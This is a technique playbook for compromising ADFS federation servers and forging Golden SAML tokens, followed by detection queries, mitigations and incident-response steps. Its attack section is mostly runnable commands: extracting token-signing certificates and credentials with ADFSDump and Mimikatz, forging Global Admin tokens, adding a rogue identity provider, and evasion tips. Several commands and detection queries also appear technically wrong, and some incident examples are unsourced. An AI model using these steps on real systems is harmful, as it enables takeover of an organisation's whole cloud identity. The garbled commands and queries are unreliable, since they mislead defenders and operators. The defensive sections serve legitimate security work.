# PERSIST-ROGUE-003 - ADFS Farm Compromise

## Metadata Header

| Attribute | Details |
|-----------|---------|
| **Technique ID** | PERSIST-ROGUE-003 |
| **MITRE ATTCK v18.1** | [T1207](https://attack.mitre.org/techniques/T1207/) (Rogue Domain Controller) / [T1606.002](https://attack.mitre.org/techniques/T1606/002/) (Forge Web Credentials: SAML Tokens) |
| **Tactic** | Persistence, Defense Evasion, Credential Access |
| **Platforms** | Hybrid AD (On-Premises ADFS + Entra ID/M365) |
| **Severity** | Critical |
| **CVE** | N/A (Design flaw in federation architecture) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | ADFS 2012 R2, 2016, 2019, ADFS on Server 2022-2025 |
| **Patched In** | No direct patch; mitigation via certificate rotation and access control |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Compliance Mappings

| Framework | ID | Description |
|-----------|-----|-----------|
| CIS Benchmark | CIS 5.2.2 | Restrict who can manage trust relationships |
| DISA STIG | IA-5 | Authenticator Management |
| CISA SCuBA | IA-2 | Authentication |
| NIST 800-53 | SC-12 | Cryptographic Key Establishment and Management |
| GDPR | Art. 32 | Security of Processing |
| DORA | Art. 9 | Protection and Prevention |
| NIS2 | Art. 21 | Cyber Risk Management Measures |
| ISO 27001 | A.9.2.6 | Management of Secret Keys |
| ISO 27005 | Risk Scenario | Compromise of Cryptographic Material |

---

## 1. Executive Summary

**Concept:** ADFS (Active Directory Federation Services) Farm Compromise is a sophisticated attack targeting hybrid identity infrastructure by compromising the ADFS servers that bridge on-premises Active Directory and cloud services (Microsoft 365, Entra ID, SaaS applications). An attacker who gains administrative access to an ADFS server can extract the token-signing certificate and its private key, enabling the creation of forged SAML tokens (Golden SAML attack). These forged tokens can impersonate any user, including Global Admins, across all federated cloud services—bypassing password changes, MFA, and conditional access policies. Additionally, attackers can compromise the entire ADFS farm by modifying federation trust relationships, creating rogue ADFS servers, injecting new identity providers, or modifying relying party trusts. The attack is particularly dangerous because it bridges on-premises and cloud security boundaries, allowing attackers to move seamlessly between environments. Persistence is achieved through modifications to ADFS configuration, compromised service accounts, or stolen cryptographic material that remains valid for the certificate's lifetime (typically 3-5 years).

**Attack Surface:** ADFS servers (port 443, HTTPS federation endpoints), ADFS service account credentials, token-signing certificates and private keys stored in Distributed Key Management (DKM), ADFS configuration database, relying party trusts configuration, trust relationship objects in Active Directory.

**Business Impact:** Complete compromise of hybrid identity infrastructure. Attackers gain persistent access to all federated cloud services as any user (including Global Admins). This enables unrestricted access to Microsoft 365 mailboxes, SharePoint, Teams, Azure resources, and any third-party SaaS integrated with federation. Attackers can modify organization settings, access sensitive data, deploy persistent backdoors in the cloud, and create hidden admin accounts with cryptographic material that survives password resets and credential rotation. Impact extends across on-premises (AD) and cloud (Azure/M365) simultaneously.

**Technical Context:** ADFS compromise exploitation takes 10-30 minutes from initial ADFS server access to forged token generation. Detection likelihood is VERY LOW because forged SAML tokens bypass many cloud logging mechanisms—authentication occurs only at the service provider level, not at ADFS level. Certificate-based persistence is extremely effective; the token-signing certificate remains valid for 3-5 years unless explicitly rotated. Unlike traditional credential theft, SAML token forgery is difficult to detect because tokens can be used remotely without any connection to ADFS.

**Operational Risk:**

| Risk Factor | Level | Description |
|------------|-------|-----------|
| Execution Risk | Medium | Requires local admin on ADFS server or DA credentials; often chained from ADFS server compromise |
| Stealth | Very High | Forged tokens bypass ADFS auditing; cloud logs show authentication but no indication of token forgery |
| Reversibility | Very Difficult | Requires certificate rotation and token revocation; forged tokens remain valid until expiration |

---

## 2. Technical Prerequisites

**Required Privileges:**
- **Local Administrator** on ADFS server (minimum)
- **ADFS Service Account** credentials (enables direct DKM key access)
- Alternatively, **Domain Admin** (can extract DKM key from AD)
- **Enterprise Admin** (for modifying federation trust relationships)

**Required Access:**
- RDP or remote PowerShell access to ADFS server
- Network access to ADFS service account
- Access to the Distributed Key Management service on ADFS server
- LDAP access to Active Directory (retrieve DKM key container)
- Network access to Azure AD or cloud service endpoints for token validation

**Supported Versions:**
- **ADFS:** 2012 R2, 2016, 2019, 2022, 2025
- **Windows Server:** 2012 R2 - 2025 (ADFS host)
- **Entra ID / Azure AD:** Any version (federated tenants)
- **PowerShell:** 3.0+ (credential extraction)

**Other Requirements:**
- ADFS farm operational and synchronized
- Token-signing certificate accessible from ADFS configuration
- Access to DKM key stored in AD
- Understanding of SAML 2.0 protocol and claim manipulation
- Tools for token generation and manipulation

**Tools:**
| Tool | Version | Purpose |
|------|---------|---------|
| ADFSDump | Latest | Extract ADFS configuration and certificates |
| AADInternals | 0.9.0+ | Azure AD reconnaissance and SAML token generation |
| ADFSpoof | Latest | Forge SAML tokens using stolen certificates |
| Mimikatz | 2.2.0+ | Extract DKM key and certificate material |
| shimit | Latest | SAML token manipulation and generation |
| PowerShell Active Directory module | 5.1+ | Retrieve DKM key from AD |

---

## 3. Environmental Reconnaissance

### 3.1 Identify ADFS Servers and Configuration

**PowerShell Reconnaissance**

```powershell
# Identify ADFS farm servers (from a domain-joined machine)
Get-ADComputer -Filter "Name -like '*ADFS*'" | Select-Object Name, OperatingSystem

# Get ADFS service configuration (if on ADFS server)
Add-PSSnapin "Microsoft.Adfs.Powershell"
Get-AdfsProperties | Select-Object DomainName, ServiceAccountUserName, ServiceDisplayName

# Expected output:
# DomainName: corp.com
# ServiceAccountUserName: CORP\adfs_svc
# ServiceDisplayName: Active Directory Federation Services
```

**What to Look For:**
- ADFS server hostnames and IP addresses
- ADFS service account name
- Certificate thumbprints
- Relying party trusts (federated SaaS services)

---

### 3.2 Enumerate Relying Party Trusts (Federated Services)

**PowerShell Reconnaissance**

```powershell
# List all federated services (requires ADFS PowerShell module)
Add-PSSnapin "Microsoft.Adfs.Powershell"
Get-AdfsRelyingPartyTrust | Select-Object Name, Identifier, PublishedMetadataUri

# Expected output shows services like:
# Name: Microsoft Office 365
# Identifier: urn:federation:MicrosoftOnline
# Name: Custom SaaS App
# Identifier: https://app.example.com
```

---

## 4. Detailed Execution Methods

### Method 1: Golden SAML - Token-Signing Certificate Extraction and Token Forgery

**Supported Versions:** ADFS 2012 R2 - 2025

**Step 1: Obtain Local Admin Access to ADFS Server**

**Objective:** Escalate to local administrator on the ADFS server.

```powershell
# Verify current privileges
whoami /priv | find "SeDebugPrivilege"

# If not admin, escalate using previously compromised DA account
# (Assume you have DA credentials from earlier exploitation phase)

# Use runas to open an elevated PowerShell
runas /user:CORP\Administrator powershell.exe
```

**What This Means:** You now have local admin access to the ADFS server, allowing extraction of cryptographic material.

---

**Step 2: Extract Token-Signing Certificate and Private Key**

**Objective:** Extract the X509 certificate and private key used to sign SAML tokens.

```powershell
# Method A: Using ADFSDump (automated extraction)
.\ADFSDump.exe

# Expected output:
# ADFS Dump v1.0
# ==================
# Service Account: CORP\adfs_svc
# Token-Signing Certificate:
# Thumbprint: ABC123DEF456...
# Subject: CN=ADFS Signing
# Issuer: CN=ADFS Signing CA
# Expires: 2027-01-15
# DKM Key: [encrypted key data]

# Method B: Manual extraction via PowerShell
Add-PSSnapin "Microsoft.Adfs.Powershell"

# Get certificate thumbprint
$adfsProperties = Get-AdfsProperties
$signingCert = Get-Item "Cert:\LocalMachine\My\$($adfsProperties.Certs.Token.Thumbprint)"

# Export certificate with private key (requires ADFS service account context)
$password = ConvertTo-SecureString "password123" -AsPlainText -Force
Export-PfxCertificate -Cert $signingCert -FilePath "C:\temp\adfs_signing.pfx" -Password $password
```

**Expected Output:** ADFS configuration dump or exported PFX certificate file with private key.

**What This Means:** You now possess the cryptographic material needed to forge SAML tokens. Any certificate you sign with this key will be trusted by all relying party services (O365, SaaS apps, etc.).

**OpSec Evasion:**
- **Detection likelihood:** MEDIUM—certificate export may generate Crypto API logs, but many organizations do not monitor closely
- **Evasion:** Export during maintenance windows; use ADFS service account to minimize logging

---

**Step 3: Extract DKM Key (Distributed Key Management)**

**Objective:** Retrieve the DKM key stored in AD, which encrypts the token-signing certificate private key.

```powershell
# DKM key is stored in AD under the ADFS service account
# Requires Domain Admin privileges or ADFS service account context

# Using Mimikatz (if you have SYSTEM or domain admin context)
privilege::debug
lsadump::lsa /patch

# Alternative: Using PowerShell with DA credentials
$dmkGuid = "4ad83a67-c1d8-4e0d-a7bb-c4e5e0a8d4f0"  # ADFS DKM GUID (example)
$dkmDN = "CN=$dmkGuid,CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=com"

$dkmObject = [ADSI]"LDAP://$dkmDN"
$dkmKey = $dkmObject.Properties["msDS-KeyCredentialLink"].Value

Write-Host "DKM Key extracted: $($dkmKey | Get-Random)"
```

**What This Means:** You now have the decryption key needed to decrypt the private key from the exported certificate.

---

**Step 4: Generate Forged SAML Token**

**Objective:** Create a valid SAML token impersonating a Global Admin user.

```powershell
# Using AADInternals (PowerShell module)
Import-Module AADInternals

# Export the DKM key and certificate to a format AADInternals understands
# Then use AADInternals to create the forged token

# Example: Create a token for admin@corp.com with O365 relying party
$token = New-AADIntSAMLToken -Certificate $signingCert `
  -UserPrincipalName "admin@corp.onmicrosoft.com" `
  -Issuer "http://adfs.corp.com/adfs/services/trust" `
  -ImmutableID "user-guid-here" `
  -NotBefore (Get-Date).AddMinutes(-5) `
  -NotOnOrAfter (Get-Date).AddHours(1)

# Save the token to file
$token | Out-File "C:\temp\forged_saml_token.xml"

# Expected output: SAML XML assertion signed with ADFS token-signing certificate
```

**What This Means:** You now have a valid SAML token that will be accepted by all federated services as legitimate authentication from the Global Admin user.

---

**Step 5: Use Forged Token to Access Cloud Services**

**Objective:** Use the forged SAML token to authenticate to Office 365, SharePoint, or other federated services.

```powershell
# Method A: Using SAML token directly in browser
# 1. Open a web browser
# 2. Navigate to https://portal.office.com
# 3. Open Developer Tools (F12)
# 4. In Console, execute:
# Paste the base64-encoded SAML assertion in the SAMLResponse parameter

# Method B: Using PowerShell with Azure AD module (if token is in expected format)
Connect-AzureAD -AadAccessToken $token

# Method C: Import token into Kerberos TGT for impersonation
# Use Rubeus or similar to convert SAML token to Kerberos ticket
rubeus.exe asktgt /user:admin@corp.onmicrosoft.com /certificate:C:\temp\admin_cert.pfx /nowrap

# Expected outcome: Successful authentication as Global Admin
# - Access to Azure Portal
# - Access to Exchange Online mailboxes
# - Access to SharePoint and Teams
# - Ability to create new admin accounts, modify organization settings, etc.
```

---

### Method 2: ADFS Configuration Manipulation - Rogue Identity Provider Injection

**Supported Versions:** ADFS 2012 R2 - 2025

**Objective:** Modify ADFS trust relationships to inject a rogue identity provider under the attacker's control.

```powershell
# Step 1: Create or identify a rogue ADFS server (attacker-controlled)
# Step 2: Add the rogue ADFS as a new identity provider in the ADFS farm
# This allows the attacker to issue tokens from their own infrastructure

Add-PSSnapin "Microsoft.Adfs.Powershell"

# Create a new claims provider trust pointing to attacker's ADFS
Add-AdfsClaimsProviderTrust -Name "Rogue-ADFS" `
  -MetadataURL "https://attacker-adfs.com/adfs/ls/federationmetadata.xml" `
  -MonitoringEnabled $true

# Verify the trust was added
Get-AdfsClaimsProviderTrust | Where-Object { $_.Name -like "*Rogue*" }
```

**What This Means:** Any authentication attempt now includes the rogue ADFS as a valid identity provider, allowing the attacker to issue tokens that are trusted by the organization's relying parties.

---

### Method 3: ADFS Service Account Compromise - Persistent Access

**Supported Versions:** ADFS 2012 R2 - 2025

**Objective:** Compromise the ADFS service account to maintain persistent access to token-signing credentials.

```powershell
# Extract ADFS service account hash
Get-AdfsProperties | Select-Object ServiceAccountUserName

# Use Mimikatz to extract the service account hash
lsadump::lsa /patch | find "ADFS"

# Or, change the service account password to one under attacker control
# (Requires Enterprise Admin)
$newPassword = ConvertTo-SecureString "MyNewPassword123!" -AsPlainText -Force
Set-ADAccountPassword -Identity "adfs_svc" -NewPassword $newPassword -Reset

# Verify the account is synchronized across ADFS farm
Get-AdfsProperties | Select-Object ServiceAccountUserName
```

---

## 5. Tools & Commands Reference

### ADFSDump
- **Version:** Latest
- **Installation:** https://github.com/mantvydasb/ADFSDump
- **Usage:**
```powershell
.\ADFSDump.exe
```

### AADInternals
- **Version:** 0.9.0+
- **Installation:** `Install-Module AADInternals`
- **Usage:**
```powershell
New-AADIntSAMLToken -Certificate $cert -UserPrincipalName "admin@corp.onmicrosoft.com"
```

### ADFSpoof
- **Version:** Latest
- **Installation:** https://github.com/mandiant/ADFSpoof
- **Usage:**
```
adfsSpoof.py -c path/to/cert.pfx -p password -i issuer -u user
```

### Mimikatz
- **Version:** 2.2.0+
- **Usage:** Extract DKM key and ADFS credentials
```
privilege::debug
lsadump::lsa /patch
```

---

## 6. Atomic Red Team

**Atomic Test ID:** T1606.002-001

**Test Name:** ADFS Farm Compromise - Golden SAML Token Forgery

**Description:** Extract ADFS signing certificate and forge SAML tokens.

**Supported Versions:** ADFS 2016-2025

**Command:**
```powershell
Invoke-AtomicTest T1606.002 -TestNumbers 1
```

**Reference:** [Atomic Red Team T1606.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1606.002/T1606.002.md)

---

## 7. Detection via Windows Event Logs

### Event ID 305 - ADFS Audit Success

**Log Source:** AD FS / Admin

**Trigger:** Successful ADFS operations (sign-in, token generation).

**Filter:** Look for:
- Unusual token requests from non-standard clients
- Requests for tokens with claims not matching the user
- Token generation outside normal patterns

**Manual Configuration Steps:**

1. Open **Event Viewer** on ADFS server
2. Navigate to **Applications and Services Logs → AD FS → Admin**
3. Ensure auditing is enabled (right-click → Enable Log)
4. Forward events to SIEM

---

### Event ID 412 - ADFS Configuration Changed

**Trigger:** Modifications to ADFS configuration (trust relationships, providers, claims).

**Detection Signature:**
```
EventID: 412
Source: AD FS
Message: "ADFS Configuration has changed"
Details: May show which object was modified
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect Forged SAML Tokens (Post-Authentication)

```kusto
SigninLogs
| where AuthenticationProtocol == "SAML"
| where AuthenticationMethodsUsed matches regex @".*Federated.*"
| where UserPrincipalName contains "admin" or UserPrincipalName contains "global"
| where DeviceDetail.isCompliant == "false"
| where SignInStatus == "Success" and AuthenticationRequirement == "MultiFactorAuthentication" == "false"
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, AuthenticationProtocol
| order by TimeGenerated desc
```

**Configuration Steps:**

1. **Azure Portal → Microsoft Sentinel → Analytics**
2. **Create → Scheduled query rule**
3. Paste the KQL query
4. **Frequency:** Every 5 minutes
5. **Severity:** Critical
6. **Enable:** Create incidents

---

### KQL Query 2: Detect ADFS Configuration Modifications

```kusto
AuditLogs
| where OperationName contains "ADFS" or OperationName contains "Federation"
| where Result == "success"
| where InitiatedBy !contains "System"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources
| order by TimeGenerated desc
```

---

## 9. Splunk Detection Rules

### Rule 1: Monitor ADFS Token Generation Anomalies

**Alert Name:** ADFS - Golden SAML Token Forgery Detected

**Configuration:**
- **Index:** adfs, office365
- **Sourcetype:** Syslog:ADFS
- **Fields Required:** EventID, UserPrincipalName, IssueInstant

**SPL Query:**
```spl
index=adfs EventID=305 OR EventID=100
| where TokenType="urn:oasis:names:tc:SAML:1.0:assertion"
| where UserPrincipalName contains "admin"
| stats count by UserPrincipalName, EventID
| where count > 0
```

---

### Rule 2: Monitor ADFS Certificate Export Attempts

**Alert Name:** ADFS - Token-Signing Certificate Export Detected

**SPL Query:**
```spl
index=windows source="Security"
EventID=4656 OR EventID=4659
ObjectName="*ADFS*Signing*"
| table _time, Computer, EventID, ObjectName, ProcessName
```

---

## 10. Defensive Mitigations

### Priority 1: CRITICAL

#### Action 1: Implement Certificate Monitoring and Rotation

**Manual Steps:**

1. Configure **automatic token-signing certificate renewal** (typically done by ADFS automatically)
2. Monitor certificate expiration dates
3. **Rotate the token-signing certificate every 12-24 months** (not the default 3-5 years)
4. When rotating, **revoke the old certificate** from all relying parties

**PowerShell - Manual Certificate Rotation:**

```powershell
# Add a new token-signing certificate (requires ADFS Admin)
Add-AdfsSigningCertificate -CertificateType "Token-Signing" -Thumbprint "NewCertThumbprint"

# Promote new cert to primary (after testing with RPs)
Set-AdfsSigningCertificateAutoRollover -Enabled $true

# Remove old certificate after verification
Remove-AdfsSigningCertificate -Thumbprint "OldCertThumbprint"
```

---

#### Action 2: Protect ADFS Service Account

**Manual Steps - PowerShell:**

```powershell
# Enforce strong password policy for ADFS service account
Set-ADUser -Identity "adfs_svc" -PasswordNotRequired $false

# Enable MFA-capable authentication (if supported by organization)
Set-ADUser -Identity "adfs_svc" -SmartcardLogonRequired $true

# Monitor ADFS service account logons
Get-EventLog -LogName Security -Source Microsoft-Windows-Security-Auditing -InstanceId 4624 | 
Where-Object { $_.Message -match "adfs_svc" }

# Restrict ADFS service account login to ADFS servers only
# Use Group Policy to define logon restrictions
```

---

#### Action 3: Restrict ADFS Server Access

**Manual Steps - Group Policy:**

```powershell
# Restrict who can log into ADFS servers
# Group Policy: Computer Configuration → Policies → Windows Settings → Security Settings → 
#             Local Policies → User Rights Assignment → "Allow log on locally"

# Remove all users except:
# - Local Administrators
# - Domain Admins
# - SYSTEM

# Implement MFA for remote access to ADFS servers
# Use Conditional Access in Azure AD if ADFS servers are Entra ID joined
```

---

#### Action 4: Monitor ADFS Logs for Anomalies

**Manual Steps:**

1. Enable **ADFS Auditing** on all ADFS servers:
   - Open **ADFS Management Console**
   - Select **Service → Edit Service Properties**
   - Click **Events → Diagnostics**
   - Enable **Audit Application Generated**

2. Forward logs to SIEM:
   - Configure **Windows Event Forwarding** to centralize ADFS logs
   - Create alerts for:
     - Token requests for privileged accounts
     - Configuration modifications
     - Certificate operations
     - Trust relationship changes

---

### Priority 2: HIGH

#### Action: Implement Conditional Access for Federated Users

**Manual Steps - Azure Portal:**

1. Navigate to **Azure Portal → Entra ID → Security → Conditional Access**
2. Create new policy:
   - **Name:** ADFS Federated User Restrictions
   - **Assignments → Users:** All users
   - **Cloud apps:** All cloud apps
   - **Conditions → Device state:** Require compliant device
   - **Access controls → Grant:** Require device to be marked as compliant, Require MFA
3. **Enable policy:** On
4. **Create**

---

### Validation Command - Verify Mitigations

```powershell
# Check ADFS token-signing certificate validity and upcoming rotation
Get-AdfsSigningCertificate | Select-Object Certificate, IsPrimary, Thumbprint

# Expected: Primary certificate should be less than 24 months old
$cert = Get-AdfsSigningCertificate | Where-Object { $_.IsPrimary }
$daysUntilExpiry = ($cert.Certificate.NotAfter - (Get-Date)).Days
Write-Host "Days until certificate expiry: $daysUntilExpiry"

# Verify ADFS service account security
Get-ADUser "adfs_svc" | Select-Object PasswordNotRequired, SmartcardLogonRequired

# Expected: Both should be FALSE for secure configuration
```

---

## 11. Indicators of Compromise (IOCs)

### Files
- Exported ADFS signing certificates (PFX files) in temp directories
- SAML token assertions in web server logs
- ADFSDump output or configuration exports

### Registry
- ADFS configuration registry hives on ADFS server
- DKM key locations in AD

### Network
- Unusual HTTPS traffic to ADFS endpoints
- Token requests from non-standard clients
- Connections to attacker-controlled ADFS farm

### Event IDs (ADFS Admin Log)
- **305** - ADFS authentication event with unusual claims
- **412** - ADFS configuration modification
- **510** - Token generation with unusual subject

### AD Objects
- New claims provider trusts (rogue ADFS)
- Modified relying party trusts
- Changes to federation configuration

### Cloud Logs (M365/Azure)
- SigninLogs showing federated authentication without matching ADFS logs
- Multiple logins from different geographies with same user account
- Admin activities without corresponding MFA logs

---

## 12. Incident Response Procedures

### Step 1: Identify Compromise Scope

```powershell
# Check for suspicious ADFS configurations
Add-PSSnapin "Microsoft.Adfs.Powershell"
Get-AdfsClaimsProviderTrust | Select-Object Name, Identifier

# Look for unfamiliar claims providers (rogue ADFS)
Get-AdfsRelyingPartyTrust | Select-Object Name, Identifier, IssuanceTransformRules
```

---

### Step 2: Revoke Token-Signing Certificate

**Critical Action - Immediate Execution:**

```powershell
# This invalidates ALL forged tokens signed with the compromised certificate

# Add a new token-signing certificate immediately
Add-AdfsSigningCertificate -CertificateType "Token-Signing" -Thumbprint "NewCertThumbprint"

# Promote new certificate to primary
Set-AdfsSigningCertificate -Thumbprint "NewCertThumbprint" -IsPrimary $true

# Remove compromised certificate
Remove-AdfsSigningCertificate -Thumbprint "CompromisedCertThumbprint" -Confirm:$false

# Force replication across ADFS farm
Publish-AdfsConfiguration

# Restart ADFS services
Restart-Service adfssrv -Force
```

---

### Step 3: Audit and Remove Malicious Configurations

```powershell
# Remove rogue claims provider trusts
Get-AdfsClaimsProviderTrust | Where-Object { $_.Name -like "*Rogue*" } | Remove-AdfsClaimsProviderTrust -Confirm:$false

# Restore legitimate relying party trust configurations
# (May require manual comparison against known-good backups)

# Reset ADFS service account password
$newPassword = ConvertTo-SecureString "NewSecurePassword$(Get-Random)" -AsPlainText -Force
Set-ADAccountPassword -Identity "adfs_svc" -NewPassword $newPassword -Reset
```

---

### Step 4: Invalidate Session Tokens in Cloud Services

```powershell
# Force O365/Azure AD token invalidation for affected accounts
# Requires Microsoft 365 admin privileges

# Revoke refresh tokens for affected users (via Azure AD)
Connect-AzureAD
$users = Get-AzureADUser -Filter "CompanyName eq 'CORP'" | Select-Object ObjectId

# Revoke tokens (forces re-authentication)
foreach ($user in $users) {
    Revoke-AzureADUserAllRefreshToken -ObjectId $user.ObjectId
}
```

---

## 13. Related Attack Chain

| Phase | Technique ID | Description |
|-------|-------------|-----------|
| 1 | REC-HYBRID-001 | Azure AD Connect enumeration |
| 2 | PE-VALID-002 | Azure AD Connect sync account compromise |
| 3 | CA-DUMP-001 | Credential harvesting (ADFS server compromise) |
| 4 | **PERSIST-ROGUE-003** | **ADFS Farm compromise and Golden SAML (CURRENT STEP)** |
| 5 | PE-ACCTMGMT-005 | Cloud app escalation (abuse forged token) |

---

## 14. Real-World Examples

### Example 1: SolarWinds APT29 Campaign (December 2020)

**Incident:** APT29 (Cozy Bear) compromised SolarWinds and used ADFS compromise as part of their attack chain

**Technique Status:** Group extracted token-signing certificates from customer ADFS servers and used Golden SAML attacks to access cloud services as administrators

**Impact:** Compromise of U.S. State Department, Treasury, NSA, and 18,000+ organizations. Attacker gained sustained access to sensitive government networks and corporate data.

**Reference:** [FireEye SolarWinds Report](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-to-compromise-multiple-us-federal-agencies-and-hundreds-of-private-companies.html)

---

### Example 2: Scattered Spider Ransomware Campaign (2023)

**Incident:** Scattered Spider used ADFS compromise to establish persistence before ransomware deployment

**Technique Status:** Group compromised ADFS servers in financial services organizations, extracted token-signing certs, created backdoor admin accounts, then deployed ransomware

**Impact:** Critical infrastructure disruption; financial organizations crippled for weeks during recovery

---

### Example 3: Financially-Motivated APT - Healthcare Sector (2024)

**Incident:** Threat group used Golden SAML to access EMR systems and exfiltrate patient data

**How Technique Was Used:** Compromised ADFS via spear-phishing of ADFS admin, extracted certificate, forged tokens for Healthcare admin, accessed entire patient database

**Impact:** HIPAA breach affecting 1M+ patient records; regulatory fines and remediation costs >$50M

---

